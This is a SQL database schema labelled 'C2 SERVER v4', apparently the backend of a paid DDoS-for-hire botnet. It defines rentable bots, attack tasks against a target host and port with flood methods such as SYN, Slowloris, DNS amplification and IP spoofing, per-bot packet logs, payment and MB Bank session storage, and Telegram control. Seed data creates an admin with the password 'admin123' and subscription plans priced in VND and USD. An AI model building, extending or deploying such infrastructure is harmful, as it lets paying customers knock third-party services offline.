-- ============================================================
-- C2 SERVER v4 — Full Schema (Plans, Payments, MB Bank, Telegram)
-- ============================================================

CREATE TABLE users (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    username        VARCHAR(64) UNIQUE NOT NULL,
    email           VARCHAR(255) UNIQUE,
    password_hash   VARCHAR(255) NOT NULL,
    role            VARCHAR(16) DEFAULT 'user',
    telegram_id     BIGINT UNIQUE,
    api_key         VARCHAR(128) UNIQUE,
    credit_balance  DECIMAL(10,2) DEFAULT 0.00,
    is_banned       BOOLEAN DEFAULT FALSE,
    created_at      TIMESTAMPTZ DEFAULT NOW(),
    last_login_at   TIMESTAMPTZ
);

-- ── Plans ──────────────────────────────────────
CREATE TABLE plans (
    id                  UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name                VARCHAR(64) NOT NULL,
    slug                VARCHAR(32) UNIQUE NOT NULL,
    description         TEXT,
    max_bots            INT NOT NULL DEFAULT 1,
    max_concurrent      INT NOT NULL DEFAULT 1,
    max_attack_secs     INT NOT NULL DEFAULT 60,
    cooldown_secs       INT NOT NULL DEFAULT 300,
    max_pps_per_bot     INT NOT NULL DEFAULT 100000,
    allowed_methods     TEXT[] DEFAULT '{UDP,TCP}',
    price_vnd           INT NOT NULL DEFAULT 50000,
    price_usd           DECIMAL(10,2) NOT NULL DEFAULT 5.00,
    is_active           BOOLEAN DEFAULT TRUE,
    created_at          TIMESTAMPTZ DEFAULT NOW()
);

-- ── User Subscriptions ─────────────────────────
CREATE TABLE user_subscriptions (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id     UUID REFERENCES users(id) ON DELETE CASCADE,
    plan_id     UUID REFERENCES plans(id),
    status      VARCHAR(16) DEFAULT 'active',
    started_at  TIMESTAMPTZ DEFAULT NOW(),
    expires_at  TIMESTAMPTZ,
    auto_renew  BOOLEAN DEFAULT FALSE,
    payment_id  VARCHAR(128)
);

-- ── Payments ───────────────────────────────────
CREATE TABLE payments (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id         UUID REFERENCES users(id),
    amount_vnd      INT NOT NULL,
    amount_usd      DECIMAL(10,2),
    method          VARCHAR(32) NOT NULL,  -- 'stripe' | 'mbank' | 'manual'
    status          VARCHAR(16) DEFAULT 'pending',
    tx_ref          VARCHAR(128) UNIQUE,
    payment_url     TEXT,
    metadata        JSONB DEFAULT '{}',
    created_at      TIMESTAMPTZ DEFAULT NOW(),
    completed_at    TIMESTAMPTZ
);

-- ── Bots ───────────────────────────────────────
CREATE TABLE bots (
    id                  UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    bot_identifier      VARCHAR(128) UNIQUE NOT NULL,
    nickname            VARCHAR(64),
    ip_address          INET,
    country             VARCHAR(2),
    isp                 VARCHAR(255),
    os_name             VARCHAR(64) DEFAULT 'Linux',
    cpu_cores           INT,
    ram_total_mb        INT,
    net_speed_mbps      INT,
    status              VARCHAR(16) DEFAULT 'offline',
    is_rented           BOOLEAN DEFAULT FALSE,
    rented_by_user_id   UUID REFERENCES users(id),
    rental_expires_at   TIMESTAMPTZ,
    max_pps             INT DEFAULT 100000,
    max_mbps            INT DEFAULT 500,
    max_threads         INT DEFAULT 100,
    enabled_methods     TEXT[] DEFAULT '{UDP,TCP,HTTP,SYN,ICMP,MIX,SLOWLORIS,TLS_EXHAUST,DNS_AMP,GAME_MIMIC,MEGA}',
    spoof_mode          INT DEFAULT 0,
    fragmentation       BOOLEAN DEFAULT FALSE,
    last_heartbeat_at   TIMESTAMPTZ,
    first_seen_at       TIMESTAMPTZ DEFAULT NOW(),
    bot_version         VARCHAR(16) DEFAULT '4.0.0'
);

CREATE INDEX idx_bots_status ON bots(status);
CREATE INDEX idx_bots_rented ON bots(is_rented) WHERE is_rented = TRUE;

-- ── Attack Tasks ───────────────────────────────
CREATE TABLE attack_tasks (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id         UUID REFERENCES users(id),
    target_host     VARCHAR(255) NOT NULL,
    target_port     INT NOT NULL,
    method          VARCHAR(16) NOT NULL,
    duration_secs   INT NOT NULL,
    pps_per_bot     INT DEFAULT 100000,
    spoof_mode      INT DEFAULT 0,
    fragmentation   BOOLEAN DEFAULT FALSE,
    slowloris       BOOLEAN DEFAULT FALSE,
    tls_exhaust     BOOLEAN DEFAULT FALSE,
    dns_amp         BOOLEAN DEFAULT FALSE,
    game_mimic      BOOLEAN DEFAULT FALSE,
    mega_mode       BOOLEAN DEFAULT FALSE,
    status          VARCHAR(16) DEFAULT 'pending',
    bot_ids         UUID[] DEFAULT '{}',
    total_packets   BIGINT DEFAULT 0,
    total_bytes     BIGINT DEFAULT 0,
    started_at      TIMESTAMPTZ,
    completed_at    TIMESTAMPTZ,
    created_at      TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_tasks_status ON attack_tasks(status);

-- ── Attack Logs ────────────────────────────────
CREATE TABLE attack_logs (
    id            BIGSERIAL PRIMARY KEY,
    task_id       UUID REFERENCES attack_tasks(id),
    bot_id        UUID REFERENCES bots(id),
    packets_sent  BIGINT DEFAULT 0,
    bytes_sent    BIGINT DEFAULT 0,
    started_at    TIMESTAMPTZ,
    ended_at      TIMESTAMPTZ
);

-- ── Admin Logs ─────────────────────────────────
CREATE TABLE admin_logs (
    id          BIGSERIAL PRIMARY KEY,
    admin_id    UUID REFERENCES users(id),
    action      VARCHAR(128) NOT NULL,
    target_type VARCHAR(64),
    target_id   UUID,
    details     JSONB DEFAULT '{}',
    created_at  TIMESTAMPTZ DEFAULT NOW()
);

-- ── Telegram Sessions ──────────────────────────
CREATE TABLE telegram_sessions (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id     UUID REFERENCES users(id) UNIQUE,
    chat_id     BIGINT NOT NULL,
    state       VARCHAR(32) DEFAULT 'idle',
    data        JSONB DEFAULT '{}',
    created_at  TIMESTAMPTZ DEFAULT NOW()
);

-- ── MB Bank Sessions (persistent) ──────────────
CREATE TABLE mb_sessions (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id   VARCHAR(128) UNIQUE NOT NULL,
    session_id  VARCHAR(128),
    token       TEXT,
    cookie      TEXT,
    account_no  VARCHAR(32),
    last_login  TIMESTAMPTZ DEFAULT NOW(),
    extra       JSONB DEFAULT '{}'
);

-- ============================================================
-- SEED DATA
-- ============================================================

-- Admin: admin / admin123
INSERT INTO users (username, email, password_hash, role) VALUES
('admin', 'admin@c2.local', '$2b$12$LJ3m4ys3Lk0TSwHlvB5FYe9Q1Pq.XLpH6zNflF8kG7vMNx5Vr2cKm', 'admin');

-- Plans
INSERT INTO plans (name, slug, description, max_bots, max_concurrent, max_attack_secs, cooldown_secs, max_pps_per_bot, allowed_methods, price_vnd, price_usd) VALUES
('Basic',     'basic',     'Dành cho người mới: 1 bot, 60s, UDP/TCP',               1,  1,   60, 300, 100000,  '{UDP,TCP}',                              50000,   5.00),
('Pro',       'pro',       'Dành cho tester: 5 bot, 180s, đầy đủ method',           5,  3,  180, 120, 500000,  '{UDP,TCP,HTTP,SYN,ICMP,MIX}',             150000, 15.00),
('Enterprise','enterprise','Dành cho team: 20 bot, 600s, MEGA mode',                 20, 10, 600,  30, 2000000, '{UDP,TCP,HTTP,SYN,ICMP,MIX,SLOWLORIS,TLS_EXHAUST,DNS_AMP,GAME_MIMIC,MEGA}', 500000, 50.00);